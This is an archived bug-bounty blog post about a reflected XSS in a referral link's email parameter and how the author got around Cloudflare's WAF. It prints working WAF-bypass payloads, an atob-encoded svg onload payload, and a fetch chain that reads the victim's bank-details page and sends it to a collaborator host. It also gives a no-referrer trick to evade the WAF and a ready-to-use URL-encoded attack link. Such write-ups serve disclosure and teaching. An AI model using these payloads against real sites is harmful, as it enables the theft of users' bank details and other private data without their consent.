# Exfiltrating Sensitive Information via Reflected XSS Bypassing Cloudflare

- **Source URL:** https://medium.com/@mayankchoubey507/exfiltrating-sensitive-information-via-reflected-xss-bypassing-cloudfare-d82d9ccc24d6?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240717161514/https://medium.com/@mayankchoubey507/exfiltrating-sensitive-information-via-reflected-xss-bypassing-cloudfare-d82d9ccc24d6
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5528 (id 5528)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Exfiltrating Sensitive Information via Reflected XSS Bypassing Cloudflare

Hello Everyone, Welcome to my inaugural blog post! I’m Mayank, and I’m thrilled to embark on this journey of sharing knowledge and insights in the vast realm of cybersecurity. In today’s article, we delve into a topic “Exfiltrating Sensitive Information via Reflected XSS Bypassing Cloudflare.”

While hunting on a private program for a considerable duration, I stumbled upon a referral functionality that caught my attention. This feature allowed me to generate a referral link incorporating both the user’s email and a referral code. Intrigued by the potential vulnerabilities inherent in passing these parameters via URL, I decided to explore the possibility of an XSS (Cross-Site Scripting) attack.

My initial attempt, injecting the payload:

`“><img src=1 onerror=alert()>`
was promptly met with a Cloudflare block. Undeterred, I persisted, utilizing a Cloudflare bypass technique and deploying an alternate payload:

`“><img only src=1 onerror=alert()>`
This time, success — triggering a popup, indicative of the XSS exploit.

Buoyed by this progress, I sought to escalate the impact of the vulnerability by attempting to exfiltrate sensitive data, specifically the authentication cookies. However, my efforts were thwarted by the cookies’ “httponly” scope, rendering them inaccessible via JavaScript.

Upon reporting the discovered vulnerability, the program manager rightfully requested a proof-of-concept (POC) demonstrating its potential impact. Despite exhaustive research, including attempts to employ the “eval” method to fetch sensitive data such as bank details from /my-account/bank-details, my endeavors were stymied by the Web Application Firewall (WAF) which blocked the execution of “eval.”

In essence, while I successfully identified and demonstrated the XSS vulnerability, limitations imposed by the WAF hindered the exploitation to its fullest potential.

Subsequently, I sought assistance via Twitter in finding a payload that could bypass the limitations posed by the Web Application Firewall (WAF), enabling me to extract details from the /my-account/bank-details endpoint and transmit the response to a collaborator. Thankfully, xnl-h4ck3r (https://x.com/xnl\_h4ck3r?t=KOhaPurgLxxGX5rO2l9fGA&s=09) graciously offered their expertise, providing a payload for me to test.

The payload shared by xnl-h4ck3r was as follows:

``<svg/ONxss='0'/ONload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;``
Upon decoding the base64 value within the payload, resolved to the javascript:alert. Excited by the prospect of success, I implemented the payload and, as anticipated, was rewarded with an alert popup.

This breakthrough opened up new possibilities for exploitation. Armed with the payload and the ability to execute JavaScript functions, I explored leveraging the `fetch` function to orchestrate my XSS exploitation, using the payload:

``javascript:fetch('https://example.com/my-account/bank-details').then(response => response.text()).then(data => fetch(`https://burp-collab.com?data=${encodeURIComponent(data)}`));``
I undertook a systematic approach by base64 encoding the payload value and implementing it initially. This method yielded positive results, as I began receiving pingbacks to my collaborator, containing the bank details of the victim user. However, the elation was short-lived, as subsequent attempts resulted in encountering Cloudflare blocks. Perplexed by this abrupt obstacle, I endeavored to decode and URL-encode the entire payload. Despite my efforts, the issue persisted, consuming significant time and resources as I delved into debugging to pinpoint the root cause.

After extensive investigation, a breakthrough emerged: I discovered that upon the user navigating to a URL containing the payload (e.g., [https://example.com/v1/api/refferral?email=LARGE-URL-ENCODED-PAYLOAD](https://example.com/v1/api/refferral?email=LARGE-URL-ENCODED-PAYLOAD)), the fetch request was successfully executed but blocked by the Web Application Firewall (WAF). Initially mistaken for a CORS error, it became evident that the WAF was intercepting the request, as the payload itself resided within the referrer header upon user navigation to our URL.

To address this challenge, I devised a mitigation strategy. By utilizing the JavaScript fetch function with a referrerPolicy set to “no-referrer” (e.g., javascript:fetch(“[https://example.com/xxxxxxx](https://example.com/xxxxxxx)", {referrerPolicy: “no-referrer”})), I successfully bypassed the WAF blockade.

Incorporating this solution into the full payload:

let us again make the full payload:

``javascript:fetch('https://example.com/my-account/bank-details', {referrerPolicy: 'no-referrer'}).then(response => response.text()).then(data => fetch(`https://burp-collab.com?data=${encodeURIComponent(data)}`));``
By base64 encoding and embedding this payload into the email parameter, I achieved the desired outcome: a triumphant exfiltration of bank details, effectively circumventing the Cloudflare WAF. Thus, marking a significant milestone in overcoming this security challenge.

\<svg/ONxss=’0'/ONload=location=window\[\`atob\`\]\`amF2YXNjcmlwdDpmZXRjaCgnaHR0cHM6Ly9leGFtcGxlLmNvbS9teS1hY2NvdW50L2JhbmstZGV0YWlscycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goYGh0dHBzOi8vYnVycC1jb2xsYWIuY29tP2RhdGE9JHtlbmNvZGVVUklDb21wb25lbnQoZGF0YSl9YCkpOw==\`;


`https://example.com/v1/referrer?email=%3c%73%76%67%2f%4f%4e%78%73%73%3d%27%30%27%2f%4f%4e%6c%6f%61%64%3d%6c%6f%63%61%74%69%6f%6e%3d%77%69%6e%64%6f%77%5b%60%61%74%6f%62%60%5d%60%61%6d%46%32%59%58%4e%6a%63%6d%6c%77%64%44%70%6d%5a%58%52%6a%61%43%67%6e%61%48%52%30%63%48%4d%36%4c%79%39%6c%65%47%46%74%63%47%78%6c%4c%6d%4e%76%62%53%39%74%65%53%31%68%59%32%4e%76%64%57%35%30%4c%32%4a%68%62%6d%73%74%5a%47%56%30%59%57%6c%73%63%79%63%70%4c%6e%52%6f%5a%57%34%6f%63%6d%56%7a%63%47%39%75%63%32%55%67%50%54%34%67%63%6d%56%7a%63%47%39%75%63%32%55%75%64%47%56%34%64%43%67%70%4b%53%35%30%61%47%56%75%4b%47%52%68%64%47%45%67%50%54%34%67%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%59%6e%56%79%63%43%31%6a%62%32%78%73%59%57%49%75%59%32%39%74%50%32%52%68%64%47%45%39%4a%48%74%6c%62%6d%4e%76%5a%47%56%56%55%6b%6c%44%62%32%31%77%62%32%35%6c%62%6e%51%6f%5a%47%46%30%59%53%6c%39%59%43%6b%70%4f%77%3d%3d%60%3b&referral-code=xxx`
BOOM! Bank details successfully exfiltrated using Reflected XSS, bypassing Cloudflare’s WAF.

Thank You for reading this blog!
